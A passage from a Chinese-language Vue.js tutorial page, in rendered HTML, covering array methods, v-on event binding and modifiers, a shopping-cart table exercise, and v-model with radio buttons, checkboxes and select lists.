class="line">//用于点到数组中元素的顺序</span><br></pre></td></tr></table></figure></div></li></ul><h5 id="替换数组"><a href="#替换数组" class="headerlink" title="替换数组"></a>替换数组</h5><ul><li><p><strong>filter()</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。</span><br></pre></td></tr></table></figure></div></li><li><p><strong>concat()</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用于连接两个或多个数组。</span><br></pre></td></tr></table></figure></div></li><li><p><strong>slice()</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">方法可从已有的数组中返回选定的元素。</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h3><blockquote><h4 id="对事件进行绑定"><a href="#对事件进行绑定" class="headerlink" title="对事件进行绑定"></a>对事件进行绑定</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;on&quot;&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;button v-on:click=&quot;handle&quot;&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el:&quot;#on&quot;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            message:&apos;Hello Vue.js!&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            handle: function() &#123;</span><br><span class="line">                this.message = this.message.split(&apos;&apos;).reverse().join(&apos;&apos;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h4 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h4><ul><li><strong>.stop</strong></li><li><strong>.prevent</strong></li><li><strong>.capture</strong></li><li><strong>.self</strong></li><li><strong>.once</strong></li></ul><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//阻止单击事件冒泡</span><br><span class="line">&lt;a @click.stop=&apos;xxxx&apos;&gt;&lt;/a&gt;</span><br><span class="line">//提交事件不再重载页面</span><br><span class="line">&lt;form @submit.prevent=&apos;xxx&apos;&gt;&lt;/form&gt;</span><br><span class="line">// 修饰符串联</span><br><span class="line">&lt;form @submit.stop.prevent=&apos;xxx&apos;&gt;&lt;/form&gt;</span><br><span class="line">//添加事件侦听器时使用事件捕获器</span><br><span class="line">&lt;div @click.capture=&apos;xxx&apos;&gt;&lt;/div&gt;</span><br><span class="line">//只当事件在该元素本身（而不是子元素)触发时触发回调</span><br><span class="line">&lt;div @click.self=&apos;xxx&apos;&gt;&lt;/div&gt;</span><br><span class="line">// 只触发一次</span><br><span class="line">&lt;div @click.onse=&apos;xxx&apos;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure></div><h4 id="KeyCode"><a href="#KeyCode" class="headerlink" title="KeyCode"></a>KeyCode</h4><ul><li><strong>.enter</strong></li><li><strong>.tab</strong></li><li><strong>.delete</strong></li><li><strong>.esc</strong></li><li><strong>.space</strong></li><li><strong>.up</strong></li><li><strong>.down</strong></li><li><strong>.left</strong></li><li><strong>.right</strong></li></ul><hr><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><strong>将一个商品List制作出一个表格，可以调整数量，并计算出总价格。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;table border=&quot;1&quot;&gt;</span><br><span class="line">            &lt;thead&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                    &lt;th&gt;&lt;/th&gt;</span><br><span class="line">                    &lt;th&gt;商品名称&lt;/th&gt;</span><br><span class="line">                    &lt;th&gt;商品价格&lt;/th&gt;</span><br><span class="line">                    &lt;th&gt;商品数量&lt;/th&gt;</span><br><span class="line">                    &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">            &lt;/thead&gt;</span><br><span class="line">            &lt;tbody&gt;</span><br><span class="line">                &lt;tr v-for=&quot;(tb,index) in list&quot;&gt;</span><br><span class="line">                    &lt;td&gt;&#123;&#123;index+1&#125;&#125;&lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;&#123;&#123;tb.name&#125;&#125;&lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;&#123;&#123;tb.price&#125;&#125;&lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;</span><br><span class="line">                        &lt;button @click=&quot;reduce(index)&quot;&gt;-&lt;/button&gt;</span><br><span class="line">                        &#123;&#123;tb.count&#125;&#125;</span><br><span class="line">                        &lt;button @click=&quot;addcount(index)&quot;&gt;+&lt;/button&gt;</span><br><span class="line">                    &lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;</span><br><span class="line">                        &lt;button @click=&quot;removevalue(index)&quot;&gt;移除&lt;/button&gt;</span><br><span class="line">                    &lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">            &lt;/tbody&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">        &lt;div&gt;总价格：&#123;&#123;allprice&#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            list: [</span><br><span class="line">                &#123;</span><br><span class="line">                    name: &apos;ipad&apos;,</span><br><span class="line">                    price: 5000,</span><br><span class="line">                    count: 4</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    name: &apos;iphone&apos;,</span><br><span class="line">                    price: 6000,</span><br><span class="line">                    count: 1</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    name: &apos;HuaWei&apos;,</span><br><span class="line">                    price: 5000,</span><br><span class="line">                    count: 5</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    name: &apos;xiaomi&apos;,</span><br><span class="line">                    price: 4000,</span><br><span class="line">                    count: 3</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            reduce: function (index) &#123;</span><br><span class="line">                if (this.list[index].count === 1) return;</span><br><span class="line">                this.list[index].count --;</span><br><span class="line">            &#125;,</span><br><span class="line">            addcount: function (index) &#123;</span><br><span class="line">                this.list[index].count ++ ;</span><br><span class="line">            &#125;,</span><br><span class="line">            removevalue: function (index) &#123;</span><br><span class="line">                this.list.splice(index,1) ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        computed: &#123;</span><br><span class="line">            allprice: function () &#123;</span><br><span class="line">                var total = 0;</span><br><span class="line">                for (var i = 0;i &lt; this.list.length;i++)&#123;</span><br><span class="line">                    var iteam = this.list[i];</span><br><span class="line">                    total += iteam.price * iteam.count;</span><br><span class="line">                &#125;</span><br><span class="line">                return total.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><hr><h2 id="表单与v-model"><a href="#表单与v-model" class="headerlink" title="表单与v-model"></a>表单与v-model</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&apos;app&apos;&gt;</span><br><span class="line">    &lt;input type=&apos;text&apos; v-model=&apos;message&apos;&gt;</span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            message: &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p><strong>v-model也支持语法糖，可以将v-model改成@input</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&apos;app&apos;&gt;</span><br><span class="line">    &lt;input type=&apos;text&apos; @input=&apos;inputinfo&apos;&gt;</span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            message: &apos;&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            inputinfo: function(e)&#123;</span><br><span class="line">                this.message = e.target.value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p><strong>当单选按钮时，不需要使用v-model，使用v-bind绑定一个布尔类型的值。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&apos;app&apos;&gt;</span><br><span class="line">    &lt;input type=&apos;radio&apos; :checked=&apos;picked&apos;&gt;</span><br><span class="line">    &lt;label&gt;单选按钮&lt;/label&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            picked: true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p><strong>如果是组合使用来实现互斥的效果，就需要v-model配合value来实现了</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;radio&quot; v-model=&quot;checked&quot; value=&quot;html&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;html&quot;&gt;HTML&lt;/label&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;radio&quot; v-model=&quot;checked&quot; value=&quot;js&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;js&quot;&gt;Js&lt;/label&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;radio&quot; v-model=&quot;checked&quot; value=&quot;css&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;css&quot;&gt;css&lt;/label&gt;&lt;br&gt;</span><br><span class="line">        &lt;p&gt;选择的是：&#123;&#123;checked&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">            el: &apos;#app&apos;,</span><br><span class="line">            data: &#123;</span><br><span class="line">                checked: &apos;js&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;checkbox&quot; v-model=&quot;checked&quot; value=&quot;html&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;html&quot;&gt;Html&lt;/label&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;checkbox&quot; v-model=&quot;checked&quot; value=&quot;js&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;js&quot;&gt;Js&lt;/label&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;checkbox&quot; v-model=&quot;checked&quot; value=&quot;css&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;css&quot;&gt;Css&lt;/label&gt;&lt;br&gt;</span><br><span class="line">    &lt;p&gt;选择的是：&#123;&#123;checked&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">       el: &apos;#app&apos;,</span><br><span class="line">       data: &#123;</span><br><span class="line">           checked: [&apos;html&apos;,&apos;js&apos;]</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><h4 id="选择列表"><a href="#选择列表" class="headerlink" title="选择列表"></a>选择列表</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;select name=&quot;&quot; id=&quot;&quot; v-model=&quot;checked&quot; multiple&gt;</span><br><span class="line">            &lt;option value=&quot;html&quot;&gt;HTML&lt;/option&gt;</span><br><span class="line">            &lt;option value=&quot;js&quot;&gt;Js&lt;/option&gt;</span><br><span class="line">            &lt;option value=&quot;css&quot;&gt;Css&lt;/option&gt;</span><br><span class="line">        &lt;/select&gt;</span><br><span class="line">        &lt;p&gt;选择的是：&#123;&#123;checked&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">           el: &apos;#app&apos;,</span><br><span class="line">           data: &#123;</span><br><span class="line">               checked: [&apos;js&apos;,&apos;css&apos;]</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><p><strong>结合v-bind来动态输出</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;select name=&quot;&quot; id=&quot;&quot; v-model=&quot;checked&quot;&gt;</span><br><span class="line">            &lt;option v-for=&quot;option in options&quot; :value=&quot;option.value&quot;&gt;&#123;&#123;option.text&#125;&#125;&lt;/option&gt;</span><br><span class="line">        &lt;/select&gt;</span><br><span class="line">        &lt;p&gt;选择的是：&#123;&#123;checked&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">            el: &apos;#app&apos;,</span><br><span class="line">            data: &#123;</span><br><span class="line">                checked: &apos;html&apos;,</span><br><span class="line">                options: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        text: &apos;Html&apos;,</span><br><span class="line">                        value: &apos;html&apos;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        text: &apos;Js&apos;,</span><br><span class="line">                        value: &apos;js&apos;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        text: &apos;Css&apos;,</span><br><span class="line">                        value: &apos;css&apos;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><h3 id="绑定值"><a href="#绑定值" class="headerlink" title="绑定值"></a>绑定值</h3><h4 id="单选按钮-1"><a href="#单选按钮-1" class="headerlink" title="单选按钮"></a>单选按钮</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;radio&quot; v-model=&quot;checked&quot; :value=&quot;value&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;&quot;&gt;单选框&lt;/label&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123;checked&#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123;value&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">            el: &apos;#app&apos;,</span><br><span class="line">            data: &#123;</span><br><span class="line">                checked: false,</span><br><span class="line">                value: 123</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><h4 id="复选框-1"><a href="#复选框-1" class="headerlink" title="复选框"></a>复选框</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td 